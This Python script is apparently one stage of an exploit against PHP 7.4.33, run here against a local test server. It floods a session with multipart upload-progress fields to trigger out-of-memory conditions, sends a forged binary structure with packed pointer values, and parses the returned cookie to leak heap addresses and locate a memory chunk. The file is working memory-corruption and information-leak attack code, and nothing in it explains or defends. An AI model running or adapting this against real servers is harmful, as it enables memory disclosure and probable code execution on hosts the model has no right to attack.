"""Try to trigger OOM via session data accumulation.
Instead of a large field, accumulate a lot of session data.
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18108/"
t = E.Target(URL, timeout=180.0, verbose=False)

def test_session_oom(port, n_fields, field_size, label):
    """Test session OOM triggers."""
    print(f"\n--- {label}: {n_fields} fields x {field_size}B ---", flush=True)

    # Request 1: Create a session with a lot of data
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    # Add many small fields to accumulate session data
    for i in range(n_fields):
        parts.append({"name": f"sess{i:04d}", "data": b"S" * field_size})
    total_kb = n_fields * field_size // 1024
    print(f"  Total session data: {total_kb}KB", flush=True)

    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
        print(f"  Request 1 response: {len(r1)}B", flush=True)
    except Exception as e:
        print(f"  REQUEST1 ERROR: {e}", flush=True)
        return False
    time.sleep(0.5)

    # Request 2: Try to leak
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
        raw = E.parse_cookie(r2)
        oom = len(raw) > 100
        c = Counter()
        for i in range(0, len(raw) - 8, 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x700000000000 <= v < 0x800000000000:
                c[v & ~0x1FFFFF] += 1
        chunk = c.most_common(1)[0][0] if c else 0
        tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
        chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
        print(f"  cookie={len(raw)}B{tag}{chunk_str}", flush=True)
        return oom
    except Exception as e:
        print(f"  REQUEST2 ERROR: {e}", flush=True)
        return False

# Test on 7.4.33 (memory_limit=2M now)
print("=== Session OOM test on 7.4.33 (memory_limit=2M) ===", flush=True)
test_session_oom(18108, 100, 16384, "100x16KB")  # 1.6MB total
time.sleep(1)
test_session_oom(18108, 500, 4096, "500x4KB")   # 2MB total
time.sleep(1)
test_session_oom(18108, 1000, 2048, "1000x2KB") # 2MB total
time.sleep(1)

print("\n=== done ===", flush=True)
